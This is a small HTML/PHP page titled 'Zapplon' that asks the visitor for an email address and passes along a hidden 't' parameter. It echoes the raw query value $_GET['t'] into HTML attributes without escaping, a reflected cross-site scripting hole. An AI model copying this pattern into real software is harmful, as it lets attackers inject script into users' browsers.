
<!DOCTYPE html>
<html>
<head>
	<title>Zapplon</title>
</head>
<body>
We are unable to fetch your email.
Please enter to continue !
<form action="email.php" method="GET" t="<?php echo $_GET['t'] ?>">
<div style="visibility: none;display: none">
       <input type="text" name="t" value="<?php echo $_GET['t'] ?>"></input>
</div>

<input type="text" id="email" name="email" placeholder="EMAIL" required></input>
<input type="submit" value="SEND"></input>
</form>

</body>
</html>